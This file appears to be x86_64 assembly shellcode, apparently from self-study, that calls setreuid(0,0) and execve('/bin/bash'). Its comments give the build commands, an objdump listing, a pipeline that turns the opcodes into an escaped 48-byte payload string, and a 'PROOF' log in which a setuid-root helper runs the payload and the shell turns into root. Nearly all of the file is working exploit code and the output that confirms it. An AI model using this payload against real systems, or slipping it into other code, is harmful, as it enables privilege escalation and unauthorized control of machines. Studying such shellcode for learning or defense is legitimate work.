; setreuid(0,0); execve("////////bin/bash")  48 bytes
; author Chase Hatch
; 2019 redux of a redieaux
; x86_64 parameters order: rdi, rsi, rdx, r10, r8, and r9
; nasm -f elf64 setreuid_execve_binbash_64.nasm -o setreuid_execve_binbash_64.o
; ld setreuid_execve_binbash_64.o -o setreuid_execve_binbash_64.elf


section .text
global _start
_start:
	; setreuid(0,0)
	xor rax, rax
        push rax
        pop rdi
        push rax
        pop rsi
        mov al, 113
        syscall

	xor rax, rax
        push rax
	push rsp
	pop rdx
	push rax
	push rsp
	pop rsi
	mov rbx, qword 0x687361622f6e6962       ;  hsab/nib 
        push rbx
        mov rbx, qword 0x2f2f2f2f2f2f2f2f       ;  ////////
        push rbx
        push rsp
        pop rdi
        mov al, 59      ;execve
        syscall
 


; fgrep setreuid /usr/include/asm/unistd_64.h 
; #define __NR_setreuid 113


; fgrep exec /usr/include/asm/unistd_64.h
; #define __NR_execve 59


;;;  objdump -Mintel -d ./setreuid_execve_binbash_64.elf 
;;;  0000000000401000 <_start>:
;;;    401000:       48 31 c0                xor    rax,rax
;;;    401003:       50                      push   rax
;;;    401004:       5f                      pop    rdi
;;;    401005:       50                      push   rax
;;;    401006:       5e                      pop    rsi
;;;    401007:       b0 71                   mov    al,0x71
;;;    401009:       0f 05                   syscall 
;;;    40100b:       48 31 c0                xor    rax,rax
;;;    40100e:       50                      push   rax
;;;    40100f:       54                      push   rsp
;;;    401010:       5a                      pop    rdx
;;;    401011:       50                      push   rax
;;;    401012:       54                      push   rsp
;;;    401013:       5e                      pop    rsi
;;;    401014:       48 bb 62 69 6e 2f 62    movabs rbx,0x687361622f6e6962
;;;    40101b:       61 73 68 
;;;    40101e:       53                      push   rbx
;;;    40101f:       48 bb 2f 2f 2f 2f 2f    movabs rbx,0x2f2f2f2f2f2f2f2f
;;;    401026:       2f 2f 2f 
;;;    401029:       53                      push   rbx
;;;    40102a:       54                      push   rsp
;;;    40102b:       5f                      pop    rdi
;;;    40102c:       b0 3b                   mov    al,0x3b
;;;    40102e:       0f 05                   syscall
;;;  


;;;  echo """\                          
;;;   48 31 c0
;;;   50                                                                    
;;;   5f                  
;;;   50                  
;;;   5e                  
;;;   b0 71               
;;;   0f 05               
;;;   48 31 c0            
;;;   50                  
;;;   54                  
;;;   5a                  
;;;   50                  
;;;   54                  
;;;   5e                  
;;;   48 bb 62 69 6e 2f 62
;;;   61 73 68 
;;;   53                  
;;;   48 bb 2f 2f 2f 2f 2f
;;;   2f 2f 2f 
;;;   53                  
;;;   54                  
;;;   5f                  
;;;   b0 3b               
;;;   0f 05               """ |tr -d $'\n' |sed -re 's/[ ]+/ /g' -e 's/[ ]+$//g' -e 's/ /\\x/'g; echo
;;;  \x48\x31\xc0\x50\x5f\x50\x5e\xb0\x71\x0f\x05\x48\x31\xc0\x50\x54\x5a\x50\x54\x5e\x48\xbb\x62\x69\x6e\x2f\x62\x61\x73\x68\x53\x48\xbb\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x53\x54\x5f\xb0\x3b\x0f\x05
;;;  


;;; PROOF ;;;

;;;  0 syanide@black-pegasus:~/Hacking-ArtOfExploitation/c-based $ id
;;;  uid=1000(syanide) gid=1000(syanide) groups=1000(syanide),56(bumblebee),108(vboxusers),971(adbusers),1001(sudo)
;;;  0 syanide@black-pegasus:~/Hacking-ArtOfExploitation/c-based $ ls -al executor3.elf
;;;  -rwsr-xr-x 1 root root 16848 Sep  9 20:45 executor3.elf
;;;  0 syanide@black-pegasus:~/Hacking-ArtOfExploitation/c-based $ ./executor3.elf "\x48\x31\xc0\x50\x5f\x50\x5e\xb0\x71\x0f\x05\x48\x31\xc0\x50\x54\x5a\x50\x54\x5e\x48\xbb\x62\x69\x6e\x2f\x62\x61\x73\x68\x53\x48\xbb\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x53\x54\x5f\xb0\x3b\x0f\x05"
;;;  \x48\x31\xc0\x50\x5f\x50\x5e\xb0\x71\x0f\x05\x48\x31\xc0\x50\x54\x5a\x50\x54\x5e\x48\xbb\x62\x69\x6e\x2f\x62\x61\x73\x68\x53\x48\xbb\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x53\x54\x5f\xb0\x3b\x0f\x05
;;;  H1�P_P^�qH1�PTZPT^H�bin/bashSH�////////ST_�;
;;;  48 bytes
;;;  tput: No value for $TERM and no -T specified
;;;  tput: No value for $TERM and no -T specified
;;;  0 root@black-pegasus:/home/syanide/Hacking-ArtOfExploitation/c-based # id
;;;  uid=0(root) gid=1000(syanide) groups=1000(syanide),56(bumblebee),108(vboxusers),971(adbusers),1001(sudo)



